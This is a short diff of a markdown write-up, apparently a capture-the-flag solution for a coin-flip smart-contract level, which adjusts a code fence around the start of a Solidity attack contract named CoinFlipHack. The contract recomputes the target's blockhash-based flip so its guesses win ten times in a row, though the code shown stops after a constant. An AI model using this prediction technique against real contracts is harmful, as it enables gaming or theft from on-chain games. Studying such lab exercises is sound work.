@@ -15,14 +15,13 @@ We can do the same calculations in another contract. Predict whether the result 
 We repeat this 10 times in a row to win.
 
 Solution:
-
+```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface CoinFlip {
 function flip(bool \_guess) external returns (bool);
 }
-```
 contract CoinFlipHack {
 address public target;
 uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
